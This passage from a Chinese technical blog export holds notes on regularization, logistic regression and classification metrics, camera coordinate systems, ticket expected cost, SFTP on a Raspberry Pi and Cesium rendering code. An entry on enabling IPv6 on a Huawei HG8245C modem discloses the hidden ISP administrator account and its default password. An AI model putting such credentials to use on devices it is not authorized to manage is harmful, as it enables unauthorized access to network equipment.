将模型复杂度作为模型中所有特征的权重的函数。 将模型复杂度作为具有非零权重的特征总数的函数。 如果模型复杂度是权重的函数，则特征权重的绝对值越高，对模型复杂度的贡献就越大。 L2正则化可以使用 L2 正则化公式来量化复杂度，该公式将正则化项定义为所有特征权重的平方和： L_2\text{ regularization term} = ||\boldsymbol w||_2^2 = {w_1^2 + w_2^2 + ... + w_n^2}在这个公式中，接近于 0 的权重对模型复杂度几乎没有影响，而离群值权重则可能会产生巨大的影响。 模型开发者通过以下方式来调整正则化项的整体影响：用正则化项的值乘以名为 lambda（又称为正则化率）的标量。也就是说，模型开发者会执行以下运算： \text{minimize(Loss(Data|Model)} + \lambda \text{ complexity(Model))}执行 L2 正则化对模型具有以下影响: 使权重值接近于 0（但并非正好为 0） 使权重的平均值接近于 0，且呈正态（钟形曲线或高斯曲线）分布。 在选择 lambda 值时，目标是在简单化和训练数据拟合之间达到适当的平衡： 如果您的 lambda 值过高，则模型会非常简单，但是您将面临数据欠拟合的风险。您的模型将无法从训练数据中获得足够的信息来做出有用的预测。 如果您的 lambda 值过低，则模型会比较复杂，并且您将面临数据过拟合的风险。您的模型将因获得过多训练数据特点方面的信息而无法泛化到新数据。 L1正则化稀疏矢量通常包含许多维度。创建特征组合会导致包含更多维度。由于使用此类高维度特征矢量，因此模型可能会非常庞大，并且需要大量的 RAM。 在高维度稀疏矢量中，最好尽可能使权重正好降至 0。正好为 0 的权重基本上会使相应特征从模型中移除。 将特征设为 0 可节省 RAM 空间，且可以减少模型中的噪点。 L1 正则化使模型中很多信息缺乏的系数正好为 0，从而在推理时节省 RAM，同时具有凸优化的优势，可有效进行计算。 L2 和 L1 采用不同的方式降低权重： L2 会降低权重2。 L1 会降低 |权重|。 因此，L2 和 L1 具有不同的导数： L2 的导数为 2 * 权重。 L1 的导数为 k（一个常数，其值与权重无关）。 逻辑回归许多问题需要将概率估算值作为输出。逻辑回归是一种极其高效的概率计算机制。实际上，您可以通过下两种方式之一使用返回的概率： “按原样” 转换成二元类别。 在很多情况下，您会将逻辑回归输出映射到二元分类问题的解决方案，该二元分类问题的目标是正确预测两个可能的标签（例如，“垃圾邮件”或“非垃圾邮件”）中的一个。 您可能想知道逻辑回归模型如何确保输出值始终落在 0 和 1 之间。巧合的是，S 型函数生成的输出值正好具有这些特性，其定义如下： y = \frac{1}{1 + e^{-z}}S 型函数会产生以下曲线图： 图7 S 型函数 如果 z 表示使用逻辑回归训练的模型的线性层的输出，则 S 型(z) 函数会生成一个介于 0 和 1 之间的值（概率）。用数学方法表示为： y' = \frac{1}{1 + e^{-(z)}}其中： y’ 是逻辑回归模型针对特定样本的输出。 z 是 b + w1x1 + w2x2 + … wNxN “w”值是该模型学习的权重和偏差。 “x”值是特定样本的特征值。 请注意，z 也称为对数几率，因为 S 型函数的反函数表明，z 可定义为标签“1”（例如“狗叫”）的概率除以标签“0”（例如“狗不叫”）的概率得出的值的对数： z = log(\frac{y}{1-y})逻辑回归模型训练线性回归的损失函数是平方损失。逻辑回归的损失函数是对数损失函数，定义如下： Log Loss = \sum_{(x,y)\in D} -ylog(y') - (1 - y)log(1 - y')其中： (xy)ϵD 是包含很多有标签样本 (x,y) 的数据集。 “y”是有标签样本中的标签。由于这是逻辑回归，因此“y”的每个值必须是 0 或 1。 “y’”是对于特征集“x”的预测值（介于 0 和 1 之间）。 对数损失函数的方程式与 Shannon 信息论中的熵测量密切相关。它也是似然函数的负对数（假设“y”属于伯努利分布）。实际上，最大限度地降低损失函数的值会生成最大的似然估计值。 正则化在逻辑回归建模中极其重要。如果没有正则化，逻辑回归的渐近性会不断促使损失在高维度空间内达到 0。因此，大多数逻辑回归模型会使用以下两个策略之一来降低模型复杂性： L2 正则化。 早停法，即，限制训练步数或学习速率。 分类指定阈值为了将逻辑回归值映射到二元类别，您必须指定分类阈值（也称为判定阈值）。如果值高于该阈值，则表示“垃圾邮件”；如果值低于该阈值，则表示“非垃圾邮件”。人们往往会认为分类阈值应始终为 0.5，但阈值取决于具体问题，因此您必须对其进行调整。 真与假以及正类别与负类别 真正例是指模型将正类别样本正确地预测为正类别。 真负例是指模型将负类别样本正确地预测为负类别。 假正例是指模型将负类别样本错误地预测为正类别 假负例是指模型将正类别样本错误地预测为负类别。 准确率准确率是一个用于评估分类模型的指标。通俗来说，准确率是指我们的模型预测正确的结果所占的比例。正式点说，准确率的定义如下： \text{Accuracy} = \frac{\text{Number of correct predictions}}{\text{Total number of predictions}}对于二元分类，也可以根据正类别和负类别按如下方式计算准确率： \text{Accuracy} = \frac{TP+TN}{TP+TN+FP+FN}其中，TP = 真正例，TN = 真负例，FP = 假正例，FN = 假负例。 精确率和召回率当使用分类不平衡的数据集（比如正类别标签和负类别标签的数量之间存在明显差异）时，单单准确率一项并不能反映全面情况。这时需要能够更好地评估分类不平衡问题的指标：精确率和召回率。 精确率的定义如下： \text{Precision} = \frac{TP}{TP+FP}从数学上讲，召回率的定义如下： \text{Recall} = \frac{TP}{TP+FN}要全面评估模型的有效性，必须同时检查精确率和召回率。遗憾的是，精确率和召回率往往是此消彼长的情况。 ROC 和曲线下面积ROC 曲线（接收者操作特征曲线）是一种显示分类模型在所有分类阈值下的效果的图表。该曲线绘制了以下两个参数： 真正例率 假正例率 真正例率 (TPR) 是召回率的同义词，因此定义如下： TPR = \frac{TP} {TP + FN}假正例率 (FPR) 的定义如下： FPR = \frac{FP} {FP + TN}ROC 曲线用于绘制采用不同分类阈值时的 TPR 与 FPR。降低分类阈值会导致将更多样本归为正类别，从而增加假正例和真正例的个数。下图显示了一个典型的 ROC 曲线。 图8 不同分类阈值下的 TP 率与 FP 率 曲线下面积表示“ROC 曲线下面积”。也就是说，曲线下面积测量的是从 (0,0) 到 (1,1) 之间整个 ROC 曲线以下的整个二维面积（参考积分学）。 图9 曲线下面积（ROC 曲线下面积） 曲线下面积对所有可能的分类阈值的效果进行综合衡量。曲线下面积的一种解读方式是看作模型将某个随机正类别样本排列在某个随机负类别样本之上的概率。 曲线下面积的取值范围为 0-1。预测结果 100% 错误的模型的曲线下面积为 0.0；而预测结果 100% 正确的模型的曲线下面积为 1.0。 曲线下面积因以下两个原因而比较实用： 曲线下面积的尺度不变。它测量预测的排名情况，而不是测量其绝对值。 曲线下面积的分类阈值不变。它测量模型预测的质量，而不考虑所选的分类阈值。 不过，这两个原因都有各自的局限性，这可能会导致曲线下面积在某些用例中不太实用： 并非总是希望尺度不变。 例如，有时我们非常需要被良好校准的概率输出，而曲线下面积无法告诉我们这一结果。 并非总是希望分类阈值不变。 在假负例与假正例的代价存在较大差异的情况下，尽量减少一种类型的分类错误可能至关重要。例如，在进行垃圾邮件检测时，您可能希望优先考虑尽量减少假正例（即使这会导致假负例大幅增加）。对于此类优化，曲线下面积并非一个实用的指标。 预测偏差逻辑回归预测应当无偏差。即: \text{预测平均值}\approx\text{观察平均值}预测偏差指的是这两个平均值之间的差值。即： \text{预测偏差} = \text{预测平均值} - \text{数据集中相应标签的平均值}造成预测偏差的可能原因包括： 特征集不完整 数据集混乱 模型实现流水线中有错误？ 训练样本有偏差 正则化过强 端到端（end to end）传统机器学习算法在应用过程中需要经历特征工程这一步骤，从研究对象中提取特征信息，便于后续的训练和测试。在传统机器学习中，特征工程非常重要，它提取特征的好坏关系到机器学习的最终效果。 本质上，特征工程是将研究对象信息降维的过程。而深度学习则无需这一手工提取特征的过程。以深度学习在图像分类中的应用为例，它直接输入高维的原始图像，输出即是图像分类。这个过程即叫做端到端。 参考链接 机器学习，by wikipedia. 机器学习速成课程，by google. MathJax使用LaTeX语法编写数学公式教程 什么是 end-to-end 神经网络？,by zhihu.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机视觉之相机成像原理与坐标系转换]]></title>
    <url>%2F2018%2F11%2F19%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89%E4%B9%8B%E7%9B%B8%E6%9C%BA%E6%88%90%E5%83%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%9D%90%E6%A0%87%E7%B3%BB%E8%BD%AC%E6%8D%A2%2F</url>
    <content type="text"><![CDATA[计算机视觉是一门研究用摄影机和计算机代替人眼对目标进行识别、跟踪和测量的学科。为了解该门学科，首先应掌握投影原理和世界坐标系、相机坐标系、图像坐标系、像素坐标系之间的转换关系。 三维投影计算机3D图形学中，三维投影是将三维空间中的点映射到二维平面上的方法。常用三维投影有正交投影和透视投影。正交投影通常用于对现实物品的三维建模，而透视投影与人的视觉系统类似，常用于在二维平面呈现三维世界。 正交投影原理正交投影是一系列用于显示三维物体的轮廓、细节或精确测量结果的变换方法。通常又称作截面图、鸟瞰图或立面图。 当视平面的法向（即摄像机的朝向）平行于笛卡尔坐标系三根坐标轴中的一根，数学变换定义如下： 若使用一个平行于y轴（侧视图）的正交投影将三维点 $a{x}$, $a{y}$,$a{z}$投影到二维平面上得到二维点 $b{x}$,$b_{y}$，可以使用如下公式 b_x=s_xa_x+c_xb_y=s_za_z+c_z其中向量s是一个任意的缩放因子，而c是一个任意的偏移量。这些常量可自由选择，通常用于将视口调整到一个合适的位置。该投影变换同样可以使用矩阵表示（为清晰起见引入临时向量d） \begin{bmatrix} d_x \\ d_y \\ \end{bmatrix} = \begin{bmatrix} 1 & 0 & 0 \\ 0 & 0 & 1 \\ \end{bmatrix} \begin{bmatrix} a_x \\ a_y \\ a_z \\ \end{bmatrix} \begin{bmatrix} b_x\\ b_y\\ \end{bmatrix} = \begin{bmatrix} s_x & 0 \\ 0 & s_z \\ \end{bmatrix} \begin{bmatrix} d_x\\ d_y\\ \end{bmatrix} + \begin{bmatrix} c_x\\ c_z\\ \end{bmatrix}虽然正交投影产生的图像在一定程度上反映了物体的三维特性，但此类投影图像和实际观测到的并不相同。特别是对于相同长度的平行线段，无论离虚拟观察者（摄像机）远近与否，它们都会在正交投影中显示为相同长度。这会导致较近的线段看起来被缩短了。 透视投影原理透视投影是为了获得接近真实三维物体的视觉效果而在二维的纸或者画布平面上绘图或者渲染的一种方法，它也称为透视图。透视投影的绘制必须根据已有的几何规则进行。 常用的透视投影视椎体模型如图1所示。设视点E位于原点，视平面P垂直于Z轴，且四边分别平行于x轴和y轴，视椎体的近截面离视点的距离为n，远截面离视点的距离为f，且一般取近截面为视平面。 图1 透视投影的标准视椎体模型 坐标系之间的转换计算机视觉通常涉及到四个坐标系：像素平面坐标系（u,v）、像平面坐标系（图像物理坐标第（x,y）、相机坐标系（Xc,Yc,Zc）和世界坐标系（Xw,Yw,Zw），如图2所示。 图2 四个坐标系 1 : 世界坐标系：根据情况而定，可以表示任何物体。单位m。 2：相机坐标系：以摄像机光心为原点（在针孔模型中也就是针孔为光心），z轴与光轴重合也就是z轴指向相机的前方（也就是与成像平面垂直），x轴与y轴的正方向与物体坐标系平行，其中上图中的f为摄像机的焦距。单位m 3：图像物理坐标系（也叫平面坐标系）：用物理单位表示像素的位置，坐标原点为摄像机光轴与图像物理坐标系的交点位置。坐标系为图上o-xy。单位是mm。单位毫米的原因是此时由于相机内部的CCD传感器是很小的，比如8mm x 6mm。但是最后图像照片是也像素为单位比如640x480.这就涉及到了图像物理坐标系与像素坐标系的变换了。下面的像素坐标系将会讲到。 4：像素坐标系：以像素为单位，坐标原点在左上角。这也是一些opencv，OpenGL等库的坐标原点选在左上角的原因。当然明显看出CCD传感器以mm单位到像素中间有转换的。举个例子，CCD传感上上面的8mm x 6mm，转换到像素大小是640x480. 假如dx表示像素坐标系中每个像素的物理大小就是1/80. 也就是说毫米与像素点的之间关系是piexl/mm. 世界坐标系到相机坐标系的转换物体之间的坐标系变换都可以表示坐标系的旋转变换加上平移变换，则世界坐标系到相机坐标系的转换关系也是如此，他们之间的变换如图3所示。 图3 世界坐标系到相机坐标系的转换 可以得到P点在相机坐标系下的坐标: \begin{bmatrix} X_c\\ Y_c\\ Z_c\\ \end{bmatrix} = R \begin{bmatrix} X_w\\ Y_w\\ Z_w\\ \end{bmatrix} +T \Rightarrow \begin{bmatrix} X_c\\ Y_c\\ Z_c\\ 1\\ \end{bmatrix} = \begin{bmatrix} R & T\\ \vec{0} & 1\\ \end{bmatrix} \begin{bmatrix} X_w\\ Y_w\\ Z_w\\ 1\\ \end{bmatrix} , R:3*3,T:3*1相机坐标系到图像物理坐标系的转换从相机坐标系到图像坐标系，属于透视投影关系，从3D转换到2D。 也可以看成是针孔模型的变种。该转换满足三角形的相似定理，如图4所示。 图4 相机坐标系到图像物理坐标系的转换 图像物理坐标系到像素坐标系的转换图像物理坐标系到像素坐标系的转换不涉及旋转变换，但是坐标原点位置不一致，大小不一致，涉及伸缩变换及平移变换，如图5所示。 图5 图像物理坐标系到像素坐标系的转换 小结四个坐标系之间存在着下述关系 ( 矩阵依次左乘 )，如图6所示: 图6 世界坐标系到像素坐标系的转换 其中相机的内参和外参可以通过张正友标定获取。通过最终的转换关系来看，一个三维中的坐标点，的确可以在图像中找到一个对应的像素点，但是反过来，通过图像中的一个点找到它在三维中对应的点就很成了一个问题，因为我们并不知道等式左边的Zc的值。 参考链接 三维投影,by wikipedia. 透视投影的原理和实现,by Goncely. 计算机视觉：相机成像原理：世界坐标系、相机坐标系、图像坐标系、像素坐标系之间的转换,by 生活没有if-else 【相机标定】四个坐标系之间的变换关系 SLAM相机位姿估计(1),by Zhao xuhui. 单目SLAM理论基础,by Zhao xuhui. 透视投影详解,by zdd. 旋转变换（一）旋转矩阵,by csxiaoshui.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[生活中的统计学之购买车展黄牛票]]></title>
    <url>%2F2018%2F11%2F17%2F%E7%94%9F%E6%B4%BB%E4%B8%AD%E7%9A%84%E7%BB%9F%E8%AE%A1%E5%AD%A6%E4%B9%8B%E8%B4%AD%E4%B9%B0%E8%BD%A6%E5%B1%95%E9%BB%84%E7%89%9B%E7%A5%A8%2F</url>
    <content type="text"><![CDATA[前段时间去看车展，一出地铁口，就有黄牛兜售车展门票，只需30元一张，而从车展正规窗口购买需要50元一张，那么买黄牛票还是买正规车展门票呢？ 黄牛票有可能是真的，这样我就只需30元就可以参观车展，也有可能是假的，这样我就得花80元才能参观车展。假设黄牛票为真的概率是p1，根据概率论的知识，我参观车展花费的期望是： E = 30*p_1+80*(1-p_1)在没有任何先验知识的前提下，假设黄牛票为真的概率是0.5，于是每次买黄牛票参观车展的花费期望是55，而每次买正规门票参观车展的花费期望是50，因此不建议买黄牛票，而应该去买正规车展门票。 参考链接 Cmd Markdown 公式指导手册 Markdown中写数学公式]]></content>
      <tags>
        <tag>统计学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[中国电信光猫华为HG8245C开启IPV6的方法]]></title>
    <url>%2F2018%2F11%2F11%2F%E4%B8%AD%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%85%89%E7%8C%AB%E5%8D%8E%E4%B8%BAHG8245C%E5%BC%80%E5%90%AFIPV6%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[据报道，目前中国电信已成功创建了IP骨干网全面支持IPv6，并且在4G网络开启了IPv6服务，在100多个城域网提供了IPv6服务[1]。那么如何使家里宽带用上IPv6服务呢？这个问题最关键是设置入户光猫使其支持IPv6。以如何光猫华为HG8245C为例，说明设置过程。 基础知识IPv6简介网际协议第6版（英文：Internet Protocol version 6，缩写：IPv6）是网际协议（IP）的最新版本，用作互联网的网上层协议，用它来取代IPv4主要是为了解决IPv4地址枯竭问题，不过它也在其他很多方面对IPv4有所改进。 IPv6格式IPv6二进位制下为128位长度，以16位为一组，每组以冒号“:”隔开，可以分为8组，每组以4位十六进制方式表示。例如：2001:0db8:85a3:08d3:1319:8a2e:0370:7344 是一个合法的IPv6地址。 同时IPv6在某些条件下可以省略： 每项数字前导的0可以省略，省略后前导数字仍是0则继续，例如下组IPv6是等价的。 123452001:0DB8:02de:0000:0000:0000:0000:0e132001:DB8:2de:0000:0000:0000:0000:e132001:DB8:2de:000:000:000:000:e132001:DB8:2de:00:00:00:00:e132001:DB8:2de:0:0:0:0:e13 可以用双冒号“::”表示一组0或多组连续的0，但只能出现一次。 1234567* 2001:DB8:2de:0:0:0:0:e13 2001:DB8:2de::e13* 2001:0DB8:0000:0000:0000:0000:1428:57ab 2001:0DB8:0000:0000:0000::1428:57ab 2001:0DB8:0:0:0:0:1428:57ab 2001:0DB8:0::0:1428:57ab 2001:0DB8::1428:57ab 如果这个地址实际上是IPv4的地址，后32位可以用10进制数表示；因此::ffff:192.168.89.9 相等于::ffff:c0a8:5909。 IPv6地址分类常用地址IPv6地址可分为三种: 单播（unicast）地址：单播地址标示一个网上接口。协议会把送往地址的数据包送往给其接口。 任播（anycast）地址: Anycast是IPv6特有的数据发送方式，它像是IPv4的Unicast（单点传播）与Broadcast（多点广播）的综合。 多播（multicast）地址: 多播地址也称组播地址。多播地址也被指定到一群不同的接口，送到多播地址的数据包会被发送到所有的地址。 特殊地址未指定地址 ::/128－所有比特皆为零的地址称作未指定地址。 链路本地地址 ::1/128－是一种单播绕回地址。如果一个应用程序将数据包送到此地址，IPv6堆栈会转送这些数据包绕回到同样的虚拟接口（相当于IPv4中的127.0.0.1/8）。 fe80::/10－这些链路本地地址指明，这些地址只在区域连线中是合法的，这有点类似于IPv4中的169.254.0.0/16。 唯一区域位域 fc00::/7－唯一区域地址（ULA，unique local address）只可在一群网站中绕送。 多播地址 ff00::/8－这个前置表明定义在”IP Version 6 Addressing Architecture”（RFC 4291）中的多播地址[ IPv4转译地址 ::ffff:x.x.x.x/96－用于IPv4映射地址。 2001::/32－用于Teredo隧道。 2002::/16－用于6to4。 IPv6优势 巨大的地址空间 新的协议头格式，加快路由速度 有效地、分级的寻址和路由结构 有状态和无状态的地址配置 内置的安全性 更好的支持Qos 用新协议处理邻节点的交互 可扩展性 设置华为光猫HG8245C开启IPv6步骤在设置华为光猫HG8245C开启IPv6之前，一是要确保所在电信已支持IPv6服务。二是获取华为HG8245C隐藏管理员帐号telecomadmin的密码，通常为nE7jA%5m。 以隐藏管理员帐号telecomadmin登录华为HG8245C的Web管理控制台后，选择“网络-&gt;宽带设置”，选择连接”2INTERNET_R_VID“,设置协议类型为“IPv4/IPv6”，设置前缀获取方式为“DHCPv6-PD”,再点应用即可。 在Debian Linux中打开终端，输入如下命令或者浏览网站http://test-ipv6.com/验证IPv6。123456789101112131415$ ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: wlan0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether e4:70:b8:30:f1:5b brd ff:ff:ff:ff:ff:ff inet 192.168.1.100/24 brd 192.168.1.255 scope global dynamic noprefixroute wlan0 valid_lft 251566sec preferred_lft 251566sec inet6 240e:bc:e60:3d00:ea5b:f704:6b65:fab1/64 scope global dynamic noprefixroute valid_lft 258984sec preferred_lft 172584sec inet6 fe80::4e2c:4397:f016:3eb4/64 scope link noprefixroute valid_lft forever preferred_lft forever 参考链接 中国电信：IPv6在线用户已超千万 年底将完成端到端服务能力.2018-07-16 维基百科.IPv6 掌握IPv6网络协议的优势,2010-06-10]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派学习之SFTP管理文件]]></title>
    <url>%2F2018%2F11%2F09%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AD%A6%E4%B9%A0%E4%B9%8BSFTP%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[当需要向树莓派发送文件时，可使用SFTP上传下载文件。下面介绍如何使用SFTP向树莓派发送下载文件。 基础知识SFTP是Secure File Transfer Protocol的缩写，安全文件传送协议。可以为传输文件提供一种安全的网络的加密方法。sftp 与 ftp 有着几乎一样的语法和功能。 SFTP 为 SSH的其中一部分，是一种传输文件至服务器的安全方式。在SSH软件包中，已经包含了一个叫作SFTP(Secure File Transfer Protocol)的安全文件信息传输子系统，SFTP本身没有单独的守护进程，它必须使用sshd守护进程（端口号默认是22）来完成相应的连接和答复操作。 SFTP传输使用了加密/解密技术，所以传输效率比普通的FTP要低得多，如果您对网络安全性要求更高时，可以使用SFTP代替FTP。 SFTP客户端程序在Windows平台，常用的SFTP客户端程序有： FileZilla WinSCP Xftp Core FTP 在Linux平台，可直接使用sftp命令进行连接服务器。 基本操作下面介绍在Debian平台使用sftp命令连接树莓派，在此之前应配置树莓派开启ssh服务。 建立连接 使用如下命令连接树莓派：1sftp pi@192.168.0.103 查看帮助 通过help查看在sftp连接下能使用的命令。从帮助中可知，在命令前加前缀“l”或者“！”即可在本地操作系统shell执行命令。12345678910111213141516171819202122232425262728293031323334sftp&gt; helpAvailable commands:bye Quit sftpcd path Change remote directory to &apos;path&apos;chgrp grp path Change group of file &apos;path&apos; to &apos;grp&apos;chmod mode path Change permissions of file &apos;path&apos; to &apos;mode&apos;chown own path Change owner of file &apos;path&apos; to &apos;own&apos;df [-hi] [path] Display statistics for current directory or filesystem containing &apos;path&apos;exit Quit sftpget [-afPpRr] remote [local] Download filereget [-fPpRr] remote [local] Resume download filereput [-fPpRr] [local] remote Resume upload filehelp Display this help textlcd path Change local directory to &apos;path&apos;lls [ls-options [path]] Display local directory listinglmkdir path Create local directoryln [-s] oldpath newpath Link remote file (-s for symlink)lpwd Print local working directoryls [-1afhlnrSt] [path] Display remote directory listinglumask umask Set local umask to &apos;umask&apos;mkdir path Create remote directoryprogress Toggle display of progress meterput [-afPpRr] local [remote] Upload filepwd Display remote working directoryquit Quit sftprename oldpath newpath Rename remote filerm path Delete remote filermdir path Remove remote directorysymlink oldpath newpath Symlink remote fileversion Show SFTP version!command Execute &apos;command&apos; in local shell! Escape to local shell? Synonym for help 下载远程文件到本地主机使用get命令下载远程文件到本地主机：123sftp&gt; get README.TXT Fetching /home/pi/wiringPi/README.TXT to README.TXT/home/pi/wiringPi/README.TXT 100% 606 39.1KB/s 00:00 get命令还有一些有用参数，如递归选项“ -r ”来递归的复制一个文件夹里面的内容，“ -P ”或者“ -p ”参数来告诉 SFTP 保持文件的权限访问位的设置和访问时间。 上传本地文件到远程主机使用“ put ”命令将文件上传到远程主机：123sftp&gt; put README.TXT Uploading README.TXT to /home/pi/README.TXTREADME.TXT 100% 606 33.6KB/s 00:00 ” put “具有类似“ get ”的参数。例如，递归选项“ -r ”可以上传整个文件夹。 参考文献 华华. 手把手教你使用 SFTP 安全地传输文件.2015-12-5.]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cesium摄像头跟踪飞机实体时晃动问题分析]]></title>
    <url>%2F2018%2F11%2F08%2FCesium%E6%91%84%E5%83%8F%E5%A4%B4%E8%B7%9F%E8%B8%AA%E9%A3%9E%E6%9C%BA%E5%AE%9E%E4%BD%93%E6%97%B6%E6%99%83%E5%8A%A8%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在3D场景下使用Cesium跟踪飞机时会出现摄像头晃动问题，导致地图背景不断晃动，影响观看。下面以最新的Cesium1.51源码为例，解析Cesium 渲染过程原理，分析跟踪实体时摄像头晃动的原因，找出可能的解决方法。 Cesium渲染过程分析使用Cesium最简单示例代码如下：1var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;); Viewer是Cesium构建应用的最基础的组件。它又是其他组件的容器，包括： animation:控制时间前进、倒退、暂停以及前进和倒退速度的组件 baseLayerPicker：图层选择组件 fullscreenButton：控制是否全屏的组件 vrButton：控制是否VR显示的组件 geocoder：地理位置搜索组件 homeButton：返回摄像头默认位置按钮组建 infoBox：信息框组件 sceneModePicker：场景模式选择组件 selectionIndicator：选择指示组件 timeline：时间线组件 navigationHelpButton：导航帮助按钮，告诉使用者如何使用鼠标和触摸屏操纵虚拟地球 CesiumWidget：虚拟地球组件 其中，虚拟地球组件CesiumWidget是Viewer包含核心组件，在Viewer中创建CesiumWidget对象时，将设置其useDefaultRenderLoop属性。设置该属性将启动渲染函数startRenderLoop。1234567891011121314//from Source/Widgets/CesiumWidget/CesiumWidget.jsuseDefaultRenderLoop : &#123; get : function() &#123; return this._useDefaultRenderLoop; &#125;, set : function(value) &#123; if (this._useDefaultRenderLoop !== value) &#123; this._useDefaultRenderLoop = value; if (value &amp;&amp; !this._renderLoopRunning) &#123; startRenderLoop(this); &#125; &#125; &#125;&#125;, 函数startRenderLoop是Cesium渲染的开始，其代码如下：12345678910111213141516171819202122232425262728293031323334353637function startRenderLoop(widget) &#123; widget._renderLoopRunning = true; var lastFrameTime = 0; function render(frameTime) &#123; if (widget.isDestroyed()) &#123; return; &#125; if (widget._useDefaultRenderLoop) &#123; try &#123; var targetFrameRate = widget._targetFrameRate; if (!defined(targetFrameRate)) &#123; widget.resize(); widget.render(); requestAnimationFrame(render); &#125; else &#123; var interval = 1000.0 / targetFrameRate; var delta = frameTime - lastFrameTime; if (delta &gt; interval) &#123; widget.resize(); widget.render(); lastFrameTime = frameTime - (delta % interval); &#125; requestAnimationFrame(render); &#125; &#125; catch (error) &#123; ... &#125; &#125; else &#123; widget._renderLoopRunning = false; &#125; &#125; requestAnimationFrame(render);&#125; CesiumWidget组件的render方法随后调用Scene的render方法。12345678910111213141516171819202122232425262728293031323334353637383940414243Scene.prototype.render = function(time) &#123; if (!defined(time)) &#123; time = JulianDate.now(); &#125; var frameState = this._frameState; this._jobScheduler.resetBudgets(); var cameraChanged = this._view.checkForCameraUpdates(this); var shouldRender = !this.requestRenderMode || this._renderRequested || cameraChanged || this._logDepthBufferDirty || (this.mode === SceneMode.MORPHING); if (!shouldRender &amp;&amp; defined(this.maximumRenderTimeChange) &amp;&amp; defined(this._lastRenderTime)) &#123; var difference = Math.abs(JulianDate.secondsDifference(this._lastRenderTime, time)); shouldRender = shouldRender || difference &gt; this.maximumRenderTimeChange; &#125; if (shouldRender) &#123; this._lastRenderTime = JulianDate.clone(time, this._lastRenderTime); this._renderRequested = false; this._logDepthBufferDirty = false; var frameNumber = CesiumMath.incrementWrap(frameState.frameNumber, 15000000.0, 1.0); updateFrameNumber(this, frameNumber, time); &#125; // Update this._preUpdate.raiseEvent(this, time); tryAndCatchError(this, update); this._postUpdate.raiseEvent(this, time); if (shouldRender) &#123; // Render this._preRender.raiseEvent(this, time); tryAndCatchError(this, render); RequestScheduler.update(); &#125; updateDebugShowFramesPerSecond(this, shouldRender); callAfterRenderFunctions(this); if (shouldRender) &#123; this._postRender.raiseEvent(this, time); &#125; &#125;; Scene的render方法中tryAndCatchError函数将调用render函数。在该render函数中，地球的主要要素（地形&amp;影像）的渲染，将在Globe的beginFrame和endFrame之间完成的。123456789101112131415161718192021222324function render(scene) &#123; ... if (defined(scene.globe)) &#123; scene.globe.beginFrame(frameState); &#125; updateEnvironment(scene); updateAndExecuteCommands(scene, passState, backgroundColor); resolveFramebuffers(scene, passState); passState.framebuffer = undefined; executeOverlayCommands(scene, passState); if (defined(scene.globe)) &#123; scene.globe.endFrame(frameState); if (!scene.globe.tilesLoaded) &#123; scene._renderRequested = true; &#125; &#125; ...&#125; 其中updateAndExecuteCommands负责数据的调度，比如哪些Tile需要创建，这些Tile相关的地形数据，以及涉及到的影像数据之间的调度，都是在该函数中维护。而scene.globe.endFrame中，会对该帧所涉及的GlobeTile的下载，解析等进行处理。 Cesium跟踪实体在Viewer组件构造函数内，Viewer订阅了场景组件Scene的渲染后事件postRender，以执行Viewer自己的_postRender函数。1eventHelper.add(scene.postRender, Viewer.prototype._postRender, this); Viewer的_postRender函数代码如下，其中updateTrackedEntity函数将更新被跟踪实体的摄像头位置：1234Viewer.prototype._postRender = function() &#123; updateZoomTarget(this); updateTrackedEntity(this);&#125;; updateTrackedEntity函数代码如下：1234567891011121314151617181920212223242526272829303132333435363738function updateTrackedEntity(viewer) &#123; if (!viewer._needTrackedEntityUpdate) &#123; return; &#125; var trackedEntity = viewer._trackedEntity; var currentTime = viewer.clock.currentTime; //Verify we have a current position at this time. This is only triggered if a position //has become undefined after trackedEntity is set but before the boundingSphere has been //computed. In this case, we will track the entity once it comes back into existence. var currentPosition = Property.getValueOrUndefined(trackedEntity.position, currentTime); if (!defined(currentPosition)) &#123; return; &#125; var scene = viewer.scene; var state = viewer._dataSourceDisplay.getBoundingSphere(trackedEntity, false, boundingSphereScratch); if (state === BoundingSphereState.PENDING) &#123; return; &#125; var sceneMode = scene.mode; if (sceneMode === SceneMode.COLUMBUS_VIEW || sceneMode === SceneMode.SCENE2D) &#123; scene.screenSpaceCameraController.enableTranslate = false; &#125; if (sceneMode === SceneMode.COLUMBUS_VIEW || sceneMode === SceneMode.SCENE3D) &#123; scene.screenSpaceCameraController.enableTilt = false; &#125; var bs = state !== BoundingSphereState.FAILED ? boundingSphereScratch : undefined; viewer._entityView = new EntityView(trackedEntity, scene, scene.mapProjection.ellipsoid); viewer._entityView.update(currentTime, bs); viewer._needTrackedEntityUpdate = false;&#125; 除此之外，Viewer组件订阅了Clock组建的onTick事件，以执行其自身的_onTick事件处理函数：1eventHelper.add(clock.onTick, Viewer.prototype._onTick, this); 